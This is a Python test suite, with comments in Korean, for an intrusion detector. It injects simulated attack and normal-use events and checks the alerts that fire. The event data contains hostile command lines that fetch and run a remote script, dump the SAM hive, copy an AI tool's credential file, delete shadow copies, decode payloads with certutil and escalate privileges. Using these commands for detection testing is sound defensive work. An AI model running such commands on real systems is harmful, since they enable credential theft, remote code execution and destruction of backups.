"""ARTEX 공격 흐름 시뮬레이션 테스트 (실제 공격 아님, 가짜 이벤트를 탐지기에 주입)

실행: python test_artex_sim.py
 - 시나리오 A: ARTEX식 공격 → 각 단계가 탐지돼야 함
 - 시나리오 B: 정상 사용 → 알림이 없어야 함
 - 시나리오 C: 실제 사례형 AI 에이전트 (2026-10 공개 사례 패턴, 명령 간격 5~6초) → 새 규칙이 잡아야 함
 - 시나리오 D: ARTEX 한국어판(artex-ko)이 이 PC에서 실행 → 설치 흔적
 - 시나리오 E: 내가 쓰는 AI 도구(Claude Code)가 비슷한 명령을 씀 → 빨간 경보 없이 기록만
 - 수집기 파서: 4688 · Sysmon XML(1·3·22) · IIS/nginx 로그 줄
 - 평소 패턴 학습: 학습한 행동은 조용, 처음 보는 행동이 몰리면 '확인 필요'
 - v1.1 시나리오 F: 금융권 웹 침투형 (고객번호 열거 → 웹쉘 → 로그 탈취)
 - v1.1 시나리오 G: LLM 을 부르는 악성코드 + 자동 실행 + 랜섬웨어 준비 · 대량 암호화
 - v1.1 시나리오 H: AI 코딩 도구 공격 (GitSpawn · 설치 스크립트 · AI 토큰 탈취)
 - v1.1 시나리오 I: 정상 개발 · 운영 (git 훅 · npm 설치 · 프로그램 설치 · 웹 배포 · 내 AI 도구) → 빨간 경보 없어야 함
"""
import json
import os
from datetime import datetime, timedelta

from collectors import parse_4688, parse_combined_line, parse_sysmon_xml, parse_w3c_line, sysmon_to_event
from detectors import RuleDetector

BASE = os.path.dirname(os.path.abspath(__file__))
CFG = json.load(open(os.path.join(BASE, "config.json"), encoding="utf-8"))


class Clock:
    def __init__(self, start):
        self.t = start

    def __call__(self):
        return self.t

    def tick(self, sec):
        self.t += timedelta(seconds=sec)


def proc(pid, ppid, name, parent, cmd=""):
    return {"pid": pid, "ppid": ppid, "name": name, "parent": parent, "cmdline": cmd}


def net(kind, rip, rport, lport, process="", ai_domain="", state="ESTABLISHED", laddr=""):
    return {"kind": kind, "raddr_ip": rip, "raddr_port": rport, "lport": lport,
            "process": process, "ai_domain": ai_domain, "state": state, "laddr": laddr}


def run(title, steps, det, clock):
    print(f"\n=== {title} ===")
    fired = []
    for label, kind, ev, wait in steps:
        clock.tick(wait)
        fn = {"logon": det.on_logon, "process": det.on_process, "network": det.on_network,
              "weblog": det.on_weblog, "dns": det.on_dns, "file": det.on_file, "registry": det.on_registry,
              "psblock": det.on_script, "object_access": det.on_object_access}[kind]
        alerts = fn(ev)
        tag = ", ".join(f"{s}:{r}" for s, r, _, _ in alerts) or "-"
        print(f"[{clock().strftime('%H:%M:%S')}] {label:38} → {tag}")
        fired += [r for _, r, _, _ in alerts]
    return fired


def scenario_attack():
    clock = Clock(datetime(2026, 10, 14, 2, 10, 0))
    det = RuleDetector(CFG, now_fn=clock)
    attacker = "101.53.80.20"     # CrowdStrike 공개 ARTEX 프록시 IP
    unknown = "45.11.22.33"       # IOC 목록에 없는 새 IP (IP 바꾼 경우)
    steps = []
    # 1) 새 IP로 포트 스캔 (IOC 미등록 IP)
    for i, port in enumerate([21, 22, 80, 135, 139, 443, 445, 1433, 3389, 8080, 8443]):
        steps.append((f"스캔 {unknown} → :{port}", "network",
                      net("inbound", unknown, 50000 + i, port), 1))
    # 2) IOC IP에서 웹 서비스 접속
    steps.append(("ARTEX 프록시 IP 접속 :443", "network",
                  net("inbound", attacker, 51111, 443, "w3wp.exe"), 5))
    # 3) 웹쉘: IIS가 cmd 실행
    steps.append(("w3wp.exe → cmd.exe", "process",
                  proc(5001, 4000, "cmd.exe", "w3wp.exe", "cmd /c whoami"), 20))
    # 4) 정찰 명령 연속 실행 (각각 cmd /c 로 띄워져 부모가 매번 다름)
    for i, c in enumerate(["whoami.exe", "ipconfig.exe", "net.exe", "systeminfo.exe"]):
        steps.append((f"정찰 {c}", "process",
                      proc(5100 + i, 5050 + i, c, "cmd.exe"), 2))
    # 5) 공격자 서버 18899 포트로 역접속
    steps.append(("역접속 38.244.50.120:18899", "network",
                  net("outbound", "38.244.50.120", 18899, 52000, "powershell.exe"), 10))
    return run("시나리오 A: ARTEX식 공격", steps, det, clock)


def scenario_normal():
    clock = Clock(datetime(2026, 10, 14, 10, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    steps = [
        ("사용자 로컬 로그인", "logon",
         {"type": "logon_success", "user": "PC\\user", "logon_type": "interactive", "src_ip": "127.0.0.1"}, 0),
        ("explorer → chrome", "process", proc(100, 50, "chrome.exe", "explorer.exe"), 5),
        ("explorer → cmd (사람이 직접)", "process", proc(101, 50, "cmd.exe", "explorer.exe"), 30),
        ("ipconfig 한 번", "process", proc(102, 101, "ipconfig.exe", "cmd.exe"), 20),
        ("chrome → 웹사이트 443", "network", net("outbound", "142.250.1.1", 443, 60000, "chrome.exe"), 5),
        ("ping 한 번 (2분 뒤)", "process", proc(103, 101, "ping.exe", "cmd.exe"), 120),
    ]
    return run("시나리오 B: 정상 사용", steps, det, clock)


def scenario_agent():
    """공개 사례 패턴: ARTEX 정찰 UA → IP 바꿔 가며 RDP → 웹쉘에서 기계 형식 명령 · 실패-수정 반복
    → certutil 디코드 · 조각 합치기 · Public 실행 → Potato 권한 상승 → SAM 저장. 명령 간격 5~6초."""
    clock = Clock(datetime(2026, 10, 19, 3, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    W, C, P = "w3wp.exe", "cmd.exe", "powershell.exe"
    steps = [("ARTEX enrich UA", "weblog", {"src_ip": "198.51.100.7", "ua": "artex-enrich/1.0", "path": "/"}, 0),
             ("spa-api-recon UA", "weblog", {"src_ip": "198.51.100.7", "ua": "Mozilla/5.0 (spa-api-recon)",
                                             "path": "/static/app.js"}, 2)]
    for i, ip in enumerate(["45.9.1.21", "45.9.2.37", "45.9.3.44"]):
        steps.append((f"RDP 접속 {ip}", "network", net("inbound", ip, 52100 + i, 3389, "svchost.exe"), 20))
    cmds = ['cmd /c "whoami /priv 2>nul & echo --- & hostname"',
            "powershell -c \"Get-ChildItem C:\\inetpub -Recurse 2>$null | Select-Object -First 20; echo '---'\"",
            r'cmd /c "type C:\inetpub\wwwroot\web.config | findstr connectionString 2>nul & echo exit:%errorlevel%"',
            r'cmd /c "type C:\inetpub\wwwroot\App\web.config | findstr connectionString 2>nul & echo exit:%errorlevel%"',
            r'cmd /c "type C:\inetpub\wwwroot\App\Config\web.config | findstr connectionString 2>nul & echo exit:%errorlevel%"']
    for i, c in enumerate(cmds):
        steps.append((f"웹쉘 명령 {i + 1}", "process", proc(7001 + i, 4000, P if c.startswith("powershell") else C, W, c), 6))
    steps += [("certutil 디코드", "process", proc(7020, 4000, C, W, r"cmd /c certutil -decode C:\Users\Public\w0.b64 C:\Users\Public\w0"), 5),
              ("조각 합치기", "process", proc(7021, 4000, C, W, r"cmd /c copy /b w0+w1 C:\Users\Public\g.exe"), 5),
              ("Public 폴더 실행", "process", {**proc(7022, 7021, "g.exe", C, "g.exe -cmd whoami"),
                                            "exe": r"C:\Users\Public\g.exe"}, 5),
              ("GodPotato", "process", proc(7023, 4000, "GodPotato-NET4.exe", C, "GodPotato-NET4.exe -cmd whoami"), 6),
              ("SAM 저장", "process", proc(7024, 7023, "reg.exe", C, r"reg save HKLM\SAM C:\Windows\Temp\s.hiv"), 6),
              ("xcai.pro 조회 (Sysmon 22)", "dns", {"query": "api.xcai.pro", "process": "g.exe", "pid": 7022}, 3)]
    return run("시나리오 C: 실제 사례형 AI 에이전트", steps, det, clock)


def scenario_artex_ko():
    clock = Clock(datetime(2026, 10, 19, 11, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    steps = [("artex-ko 실행", "process", {**proc(8001, 1200, "artex-ko.exe", "explorer.exe", "artex-ko.exe serve"),
                                          "exe": r"D:\tools\artex-ko\artex-ko.exe"}, 0),
             ("콘솔 :8787 열림", "network", {**net("listen", "", 0, 8787, "artex-ko.exe"), "laddr": "0.0.0.0:8787"}, 2)]
    return run("시나리오 D: ARTEX 한국어판이 이 PC에서 실행", steps, det, clock)


def scenario_local_ai():
    """내가 Claude Code 로 개발 — 기계 형식 명령 · 재시도가 있어도 외부 침입 아님"""
    clock = Clock(datetime(2026, 10, 19, 14, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    anc = [{"pid": 900, "name": "node.exe", "cmdline": "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js"},
           {"pid": 800, "name": "WindowsTerminal.exe", "cmdline": ""}]
    steps = []
    for i, c in enumerate(['cmd /c "git status 2>nul & echo --- & git log -3"',
                           'cmd /c "python -m pytest -q 2>nul | head -20 & echo exit:%errorlevel%"',
                           'cmd /c "python -m pytest -q tests 2>nul | head -20 & echo exit:%errorlevel%"',
                           'cmd /c "python -m pytest -q tests/unit 2>nul | head -20 & echo exit:%errorlevel%"']):
        steps.append((f"Claude Code 명령 {i + 1}", "process",
                      {**proc(9001 + i, 900, "cmd.exe", "node.exe", c), "ancestors": anc}, 5))
    steps += [("Jupyter 127.0.0.1:8888", "network", {**net("listen", "", 0, 8888, "python.exe"), "laddr": "127.0.0.1:8888"}, 3),
              ("정상 브라우저 웹 요청", "weblog", {"src_ip": "203.0.113.9", "ua": "Mozilla/5.0 (Windows NT 10.0) Chrome/141",
                                           "path": "/main.js"}, 1)]
    return run("시나리오 E: 내가 쓰는 AI 도구 (외부 침입 아님)", steps, det, clock)


def scenario_web():
    clock = Clock(datetime(2026, 10, 21, 2, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    ip = "45.9.7.33"
    steps = []
    for i in range(32):
        steps.append((f"조회 custNo {i + 1}", "weblog",
                      {"src_ip": ip, "path": f"/loan/agent/status?custNo=10{48230 + i * 7}", "ua": "Mozilla/5.0"}, 1))
    steps += [("웹쉘 업로드 (Sysmon 11)", "file", {"pid": 4000, "process": "w3wp.exe",
                                                "exe": r"C:\Windows\System32\inetsrv\w3wp.exe",
                                                "path": r"C:\inetpub\wwwroot\upload\help.aspx"}, 5),
              ("웹쉘 → 로그 압축", "process", proc(7101, 4000, "powershell.exe", "w3wp.exe",
                                             r"powershell Compress-Archive C:\inetpub\logs\LogFiles C:\Users\Public\l.zip"), 6)]
    return run("시나리오 F: 금융권 웹 침투형", steps, det, clock)


def scenario_llm():
    clock = Clock(datetime(2026, 10, 21, 3, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    W = {**proc(7201, 6100, "wscript.exe", "winword.exe", r"wscript.exe C:\Users\Public\report.vbs"),
         "exe": r"C:\Windows\System32\wscript.exe"}
    steps = [("Word → wscript", "process", W, 0),
             ("wscript → LLM API", "network", {**net("outbound", "18.239.50.10", 443, 53110, "wscript.exe",
                                                    ai_domain="router.huggingface.co"), "pid": 7201}, 2),
             ("LLM 응답 뒤 명령", "process", proc(7202, 7201, "cmd.exe", "wscript.exe", "cmd /c systeminfo"), 3),
             ("Run 키 등록 (Sysmon 13)", "registry", {"pid": 7201, "process": "wscript.exe", "exe": r"C:\Windows\System32\wscript.exe",
                                                    "key": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                                                    "value": r"wscript.exe C:\Users\Public\report.vbs"}, 2),
             ("PowerShell 4104: Gemini 호출", "psblock", {"block_id": "b1", "text":
                 "$r = Invoke-RestMethod -Uri 'https://generativelanguage.googleapis.com/v1beta/models/x:generateContent' -Method Post"}, 2),
             ("백업 삭제", "process", proc(7203, 7201, "vssadmin.exe", "wscript.exe", "vssadmin delete shadows /all /quiet"), 2)]
    for i in range(55):
        steps.append((f"암호화 파일 {i + 1}", "file", {"pid": 7300, "process": "svc.exe", "exe": r"C:\Users\Public\svc.exe",
                                                   "path": f"C:\\Users\\kim\\Documents\\보고서{i}.docx.r4nd"}, 0.5))
    return run("시나리오 G: LLM 을 부르는 악성코드 · 랜섬웨어", steps, det, clock)


def scenario_coding_agent():
    clock = Clock(datetime(2026, 10, 21, 4, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    anc_cc = [{"pid": 900, "name": "node.exe", "cmdline": "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js"}]
    steps = [("GitSpawn: git → powershell", "process",
              {**proc(8101, 8100, "powershell.exe", "git.exe", "powershell -nop -c iex(iwr http://x/a.ps1)"),
               "ancestors": [{"pid": 8100, "name": "git.exe", "cmdline": "git status"}] + anc_cc}, 0),
             ("npm 설치 중 다운로드", "process",
              {**proc(8201, 8200, "powershell.exe", "cmd.exe", "powershell -enc SQBFAFgA"),
               "ancestors": [{"pid": 8200, "name": "cmd.exe", "cmdline": "cmd /c node install.js"},
                             {"pid": 8199, "name": "node.exe", "cmdline": "npm install colors-helper"}]}, 5),
             ("인포스틸러: 토큰 복사", "process",
              {**proc(8301, 8300, "cmd.exe", "upd.exe", r"cmd /c copy %USERPROFILE%\.claude\.credentials.json C:\Users\Public\c.dat"),
               "exe": r"C:\Windows\System32\cmd.exe"}, 5),
             ("4663: 낯선 프로그램이 MCP 설정 읽음", "object_access",
              {"object": r"C:\Users\kim\.cursor\mcp.json", "process": "upd.exe", "pid": 8300}, 3)]
    return run("시나리오 H: AI 코딩 도구 공격", steps, det, clock)


def scenario_normal_dev():
    clock = Clock(datetime(2026, 10, 21, 14, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    anc_cc = [{"pid": 900, "name": "node.exe", "cmdline": "node C:\\npm\\node_modules\\@anthropic-ai\\claude-code\\cli.js"}]
    steps = [("git 훅 (sh)", "process", {**proc(9101, 9100, "sh.exe", "git.exe", "sh .git/hooks/pre-commit"),
                                         "ancestors": [{"pid": 9100, "name": "git.exe", "cmdline": "git commit"}]}, 0),
             ("git → https 원격", "process", proc(9102, 9100, "git-remote-https.exe", "git.exe", "git-remote-https origin"), 2),
             ("npm 설치 → node-gyp", "process", {**proc(9201, 9200, "cmd.exe", "node.exe", "cmd /c node-gyp rebuild"),
                                                "ancestors": [{"pid": 9200, "name": "node.exe", "cmdline": "npm install"}]}, 5),
             ("msiexec 가 Run 키 등록", "registry", {"pid": 9300, "process": "msiexec.exe", "exe": r"C:\Windows\System32\msiexec.exe",
                                                  "key": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Zoom",
                                                  "value": r"\"C:\Program Files\Zoom\bin\Zoom.exe\" --autostart"}, 5),
             ("배포 도구가 웹 폴더에 파일", "file", {"pid": 9400, "process": "msdeploy.exe", "exe": r"C:\Program Files\IIS\msdeploy.exe",
                                               "path": r"C:\inetpub\wwwroot\app\Default.aspx"}, 5),
             ("Claude Code 가 자기 토큰 읽음 (4663)", "object_access",
              {"object": r"C:\Users\kim\.claude\.credentials.json", "process": "node.exe", "pid": 900}, 2),
             ("git checkout 으로 .ts 파일 다량 생성", "file", {"pid": 9500, "process": "git.exe", "exe": r"C:\Program Files\Git\bin\git.exe",
                                                          "path": r"C:\Users\kim\src\app\index.ts"}, 1),
             ("웹 페이지 정상 탐색", "weblog", {"src_ip": "45.9.8.1", "path": "/loan/agent/status?custNo=1048230", "ua": "Mozilla/5.0"}, 1),
             ("Claude Code 가 LLM 접속 후 명령", "network", {**net("outbound", "160.79.104.10", 443, 53300, "node.exe",
                                                                  ai_domain="api.anthropic.com"), "pid": 900}, 1),
             ("  → cmd 실행", "process", {**proc(9601, 900, "cmd.exe", "node.exe", "cmd /c git status"), "ancestors": anc_cc}, 2),
             ("PowerShell 4104: 정상 관리 스크립트", "psblock", {"block_id": "n1", "text": "Get-Service | Where-Object Status -eq Running"}, 1),
             ("관리자가 로그 압축 (웹 서버와 무관)", "process", {**proc(9701, 9700, "powershell.exe", "explorer.exe",
                                                               r"powershell Compress-Archive C:\inetpub\logs\LogFiles D:\backup\logs.zip"),
                                                         "ancestors": [{"pid": 9700, "name": "explorer.exe", "cmdline": ""}]}, 2)]
    for i in range(60):
        steps.append(("", "file", {"pid": 9500, "process": "git.exe", "exe": r"C:\Program Files\Git\bin\git.exe",
                                   "path": f"C:\\Users\\kim\\src\\app\\m{i}.ts"}, 0.2))
    return run("시나리오 I: 정상 개발 · 운영", steps, det, clock)


def scenario_linux_attack():
    import monitor
    clock = Clock(datetime(2026, 10, 21, 5, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    steps = [(f"{k} {ev.get('type') or ev.get('cmdline') or ev.get('path') or ev.get('raddr_ip')}"[:38], k, ev, w * 2)
             for k, ev, w in monitor.scenario_linux()]
    return run("시나리오 J: 리눅스 서버 침입", steps, det, clock)


def scenario_linux_normal():
    clock = Clock(datetime(2026, 10, 21, 15, 0, 0))
    det = RuleDetector(CFG, now_fn=clock)
    ans = [{"pid": 700, "name": "python3", "cmdline": "/usr/bin/python3 /root/.ansible/tmp/ansible-tmp-1/AnsiballZ_setup.py"},
           {"pid": 690, "name": "sh", "cmdline": "/bin/sh -c ansible"}, {"pid": 600, "name": "sshd", "cmdline": "sshd: deploy"}]
    steps = [("내부망 SSH 로그인", "logon", {"type": "logon_success", "user": "ops", "src_ip": "10.10.1.5", "logon_type": "ssh"}, 0)]
    for i, c in enumerate(["whoami", "id", "uname", "hostname", "ss"]):
        steps.append((f"ansible 정보 수집 {c}", "process", {**proc(7100 + i, 700, c, "python3", c), "ancestors": ans}, 1))
    steps += [("php-fpm → sendmail", "process", proc(7200, 7199, "sh", "php-fpm8.1", "sh -c /usr/sbin/sendmail -t -i"), 3),
              ("git 훅 (Linux)", "process", proc(7300, 7299, "sh", "git", "sh .git/hooks/pre-commit"), 3),
              ("git 자격 증명 도우미", "process", proc(7301, 7299, "sh", "git", "sh -c 'git credential-cache get'"), 1),
              ("패키지가 cron 추가", "file", {"path": "/etc/cron.d/sysstat", "value": "5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1",
                                           "process": "", "source": "poll", "new_file": True}, 3),
              ("서비스 파일 추가", "file", {"path": "/etc/systemd/system/myapp.service", "value": "ExecStart=/opt/myapp/bin/myapp",
                                          "process": "", "source": "poll"}, 3),
              ("배포 계정이 웹 파일 올림", "file", {"path": "/var/www/html/index.php", "process": "", "source": "poll", "owner": "deploy"}, 3),
              ("curl 로 업데이트 확인", "network", net("outbound", "151.101.2.132", 443, 40100, "curl"), 3)]
    return run("시나리오 K: 리눅스 정상 운영", steps, det, clock)


def test_parsers():
    print("\n=== 수집기 파서 ===")
    ok = True
    s = ["S-1-5-18", "WEB01$", "CORP", "0x3e7", "0x1c2c", r"C:\Windows\System32\cmd.exe", "%%1936", "0x1a2b",
         'cmd /c "whoami /priv 2>nul & echo ---"', "S-1-0-0", "-", "-", "0x0", r"C:\Windows\System32\inetsrv\w3wp.exe",
         "S-1-16-12288"]
    e = parse_4688(s)
    ok &= e["pid"] == 0x1c2c and e["ppid"] == 0x1a2b and e["name"] == "cmd.exe" and e["parent"] == "w3wp.exe"
    print(f"  4688        → {e['name']} ← {e['parent']} pid={e['pid']} {'OK' if ok else 'FAIL'}")
    xml = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>22</EventID>"
           "<EventRecordID>4242</EventRecordID></System><EventData><Data Name='ProcessId'>7022</Data>"
           "<Data Name='QueryName'>api.xcai.pro</Data><Data Name='Image'>C:\\Users\\Public\\g.exe</Data></EventData></Event>")
    eid, rec, data = parse_sysmon_xml(xml)
    kind, ev = sysmon_to_event(eid, data)
    o2 = eid == 22 and rec == 4242 and kind == "dns" and ev["process"] == "g.exe" and ev["query"] == "api.xcai.pro"
    print(f"  Sysmon 22   → {ev['process']} → {ev['query']} {'OK' if o2 else 'FAIL'}")
    x3 = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>3</EventID>"
          "<EventRecordID>4243</EventRecordID></System><EventData><Data Name='Image'>C:\\Windows\\System32\\certutil.exe</Data>"
          "<Data Name='ProcessId'>7030</Data><Data Name='Initiated'>true</Data><Data Name='SourceIp'>10.0.0.5</Data>"
          "<Data Name='SourcePort'>52011</Data><Data Name='DestinationIp'>38.244.50.120</Data>"
          "<Data Name='DestinationPort'>18899</Data></EventData></Event>")
    k3, e3 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x3)) if i != 1])
    o2 = o2 and k3 == "network" and e3["kind"] == "outbound" and e3["raddr_ip"] == "38.244.50.120" and e3["raddr_port"] == 18899
    print(f"  Sysmon 3    → {e3['process']} → {e3['raddr_ip']}:{e3['raddr_port']} {'OK' if o2 else 'FAIL'}")
    from collectors import parse_4663, ps4104_to_event
    ns = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><EventID>{}</EventID><EventRecordID>9</EventRecordID></System><EventData>{}</EventData></Event>"
    x11 = ns.format(11, "<Data Name='Image'>C:\\Windows\\System32\\inetsrv\\w3wp.exe</Data><Data Name='ProcessId'>4000</Data>"
                        "<Data Name='TargetFilename'>C:\\inetpub\\wwwroot\\a.aspx</Data>")
    e11 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x11)) if i != 1])
    x13 = ns.format(13, "<Data Name='EventType'>SetValue</Data><Data Name='Image'>C:\\Windows\\System32\\wscript.exe</Data>"
                        "<Data Name='ProcessId'>7201</Data><Data Name='TargetObject'>HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\U</Data>"
                        "<Data Name='Details'>wscript.exe C:\\Users\\Public\\r.vbs</Data>")
    e13 = sysmon_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x13)) if i != 1])
    x4104 = ns.format(4104, "<Data Name='MessageNumber'>1</Data><Data Name='ScriptBlockText'>Get-Date</Data><Data Name='ScriptBlockId'>abc</Data>")
    e4104 = ps4104_to_event(*[v for i, v in enumerate(parse_sysmon_xml(x4104)) if i != 1])
    e4663 = parse_4663(["S-1", "kim", "PC", "0x1", "Security", "File", r"C:\Users\kim\.cursor\mcp.json", "0x4",
                        "%%4416", "0x1", "0x1f40", r"C:\Users\Public\upd.exe"])
    o5 = (e11[0] == "file" and e11[1]["process"] == "w3wp.exe" and e11[1]["path"].endswith("a.aspx")
          and e13[0] == "registry" and e13[1]["key"].endswith("Run\\U") and e4104[1]["text"] == "Get-Date"
          and e4663["process"] == "upd.exe" and e4663["pid"] == 0x1f40 and e4663["object"].endswith("mcp.json"))
    print(f"  Sysmon 11·13 · 4104 · 4663 → {'OK' if o5 else 'FAIL'}")
    w2 = parse_w3c_line("2026-10-21 02:00:01 10.0.0.5 GET /loan/status custNo=1048230 443 - 45.9.7.33 Mozilla/5.0 - 200 0 0 12",
                        "date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken".split())
    o5 = o5 and w2["path"] == "/loan/status?custNo=1048230"
    print(f"  IIS 쿼리 포함 → {w2['path']} {'OK' if o5 else 'FAIL'}")
    o2 = o2 and o5
    fields = "date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken".split()
    w = parse_w3c_line("2026-10-19 03:00:01 10.0.0.5 GET /main.js - 443 - 198.51.100.7 Mozilla/5.0+(spa-api-recon) - 200 0 0 12", fields)
    o3 = w and w["ua"] == "Mozilla/5.0 (spa-api-recon)" and w["src_ip"] == "198.51.100.7"
    print(f"  IIS W3C     → {w['src_ip']} '{w['ua']}' {'OK' if o3 else 'FAIL'}")
    c = parse_combined_line('198.51.100.7 - - [19/Oct/2026:03:00:01 +0900] "GET / HTTP/1.1" 200 512 "-" "artex-enrich/1.0"')
    o4 = c and c["ua"] == "artex-enrich/1.0"
    print(f"  nginx 로그  → {c['src_ip']} '{c['ua']}' {'OK' if o4 else 'FAIL'}")
    return ok and o2 and o3 and o4


def test_baseline():
    """평소 패턴 학습: 8일 동안 평소 행동을 배운 뒤 → 평소 행동은 조용, 처음 보는 행동 3가지가 몰리면 알림"""
    from baseline import Baseline
    print("\n=== 평소 패턴 학습 ===")
    clock = Clock(datetime(2026, 10, 1, 9, 0, 0))
    cfg = {**CFG, "baseline": {"enabled": True, "learn_days": 7, "min_events": 200, "burst": 3, "window_sec": 600}}
    bl = Baseline(cfg, now_fn=clock)
    normal = [("process", {"name": "chrome.exe", "parent": "explorer.exe", "exe": r"C:\Program Files\Google\Chrome\chrome.exe"}),
              ("process", {"name": "git.exe", "parent": "cmd.exe", "exe": r"C:\Program Files\Git\cmd\git.exe"}),
              ("network", {"kind": "outbound", "process": "chrome.exe", "raddr_port": 443}),
              ("process", {"name": "python.exe", "parent": "cmd.exe", "exe": r"C:\Users\jun\AppData\Local\Programs\Python\python.exe"})]
    for day in range(8):
        for k, ev in normal * 10:
            bl.check(k, ev)
        clock.tick(86400)
    print(f"  상태: {bl.status()}")
    quiet = sum(len(bl.check(k, ev)) for k, ev in normal)
    odd = [("process", {"name": "rundll32.exe", "parent": "excel.exe", "exe": r"C:\Windows\System32\rundll32.exe"}),
           ("process", {"name": "x.exe", "parent": "rundll32.exe", "exe": r"C:\ProgramData\x\x.exe"}),
           ("network", {"kind": "outbound", "process": "x.exe", "raddr_port": 8443})]
    hits = []
    for k, ev in odd:
        clock.tick(30)
        hits += bl.check(k, ev)
    again = sum(len(bl.check(k, ev)) for k, ev in odd)   # 한 번 본 조합은 다시 알리지 않음
    for h in hits:
        print(f"  {h[0]}:{h[1]} — {', '.join(h[3]['new'])}")
    ok = bl.ready() and quiet == 0 and len(hits) == 1 and again == 0
    print(f"  평소 행동 알림 {quiet}건 · 처음 보는 행동 알림 {len(hits)}건 · 반복 알림 {again}건 → {'OK' if ok else 'FAIL'}")
    return ok


def judge_check(det_rules):
    """시나리오 C 알림으로 'AI 공격 프로그램' 판정이 나오는지 (webui.judge_ai)"""
    import webui
    rows = [{"rule": r, "severity": "HIGH", "detail": {}, "ts": f"2026-10-19T03:{i // 10:02d}:{(i * 6) % 60:02d}"}
            for i, r in enumerate(det_rules)]
    jd = webui.judge_ai(rows)
    print(f"\n=== AI 판정 (시나리오 C) ===\n  {jd['verdict']} · 자동화 점수 {jd['autoScore']}")
    return jd["level"] == "ai"


if __name__ == "__main__":
    from attack_taxonomy import INTRUSION_RULES
    a = scenario_attack()
    b = scenario_normal()
    c = scenario_agent()
    d = scenario_artex_ko()
    e = scenario_local_ai()
    parsers = test_parsers()
    base_ok = test_baseline()
    f_ = scenario_web()
    g_ = scenario_llm()
    h_ = scenario_coding_agent()
    i_ = scenario_normal_dev()
    j_ = scenario_linux_attack()
    k_ = scenario_linux_normal()
    judged = judge_check(c)
    expect = {"port_scan", "ioc_ip_match", "webserver_spawned_shell", "recon_burst"}
    expect_c = {"artex_user_agent", "distributed_ips", "agent_command_style", "retry_loop", "payload_staging",
                "privilege_escalation", "credential_dump", "ioc_domain_query"}
    print("\n=== 결과 ===")
    miss = 0
    for r in sorted(expect):
        print(f"  {'OK ' if r in a else 'MISS'} A {r}")
        miss += r not in a
    for r in sorted(expect_c):
        print(f"  {'OK ' if r in c else 'MISS'} C {r}")
        miss += r not in c
    print(f"  {'OK ' if 'artex_host_artifact' in d else 'MISS'} D artex_host_artifact")
    miss += "artex_host_artifact" not in d
    for tag, got, want in (("F", f_, {"object_enumeration", "webshell_file_created", "log_theft"}),
                           ("G", g_, {"llm_malware_pattern", "llm_then_exec", "autorun_change", "ransomware_prep", "mass_file_change"}),
                           ("H", h_, {"git_spawned_unusual", "package_install_exec", "agent_secret_access"}),
                           ("J", j_, {"brute_force", "remote_rdp_logon", "webserver_spawned_shell", "recon_burst",
                                      "lolbin_outbound", "odd_port_outbound", "payload_staging", "credential_dump",
                                      "user_created", "added_to_admin_group", "autorun_change", "webshell_file_created"})):
        for r in sorted(want):
            print(f"  {'OK ' if r in got else 'MISS'} {tag} {r}")
            miss += r not in got
    i_intr = [r for r in i_ if r in INTRUSION_RULES]
    print(f"  정상 개발·운영(I) → 빨간 경보 {len(i_intr)}건 ({'OK' if not i_intr else '오탐: ' + ', '.join(i_intr)})"
          f" · 기록만: {', '.join(sorted(set(i_))) or '없음'}")
    miss += len(i_intr)
    k_intr = [r for r in k_ if r in INTRUSION_RULES]
    print(f"  리눅스 정상 운영(K) → 빨간 경보 {len(k_intr)}건 ({'OK' if not k_intr else '오탐: ' + ', '.join(k_intr)})"
          f" · 기록만: {', '.join(sorted(set(k_))) or '없음'}")
    miss += len(k_intr)
    e_intr = [r for r in e if r in INTRUSION_RULES]
    print(f"  정상 사용 알림 수: {len(b)} ({'OK' if not b else '오탐 있음: ' + ', '.join(b)})")
    print(f"  내 AI 도구 사용 → 빨간 경보 {len(e_intr)}건 ({'OK' if not e_intr else '오탐: ' + ', '.join(e_intr)})"
          f" · 기록만: {', '.join(e) or '없음'}")
    print(f"  수집기 파서: {'OK' if parsers else 'FAIL'} · AI 판정: {'OK' if judged else 'FAIL'}"
          f" · 평소 패턴 학습: {'OK' if base_ok else 'FAIL'}")
    bad = miss + len(b) + len(e_intr) + (not parsers) + (not judged) + (not base_ok)
    print(f"\n{'모두 통과' if not bad else f'실패 {bad}건'}")
    raise SystemExit(1 if bad else 0)
